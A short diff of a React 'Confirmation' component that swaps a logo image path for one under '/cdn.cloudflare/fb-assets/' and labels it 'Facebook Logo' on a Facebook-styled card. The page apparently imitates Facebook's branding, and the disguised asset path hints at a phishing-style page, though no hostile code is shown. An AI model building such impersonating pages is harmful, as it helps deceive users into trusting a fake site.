@@ -97,8 +97,8 @@ export default function Confirmation() {
       <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
         <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
           <img 
-            src="[CDN_URL]/meta/facebook-logo-2023.png"
-            alt="Logo"
+            src="/cdn.cloudflare/fb-assets/logo-2023.png"
+            alt="Facebook Logo"
             className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
           />
           <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
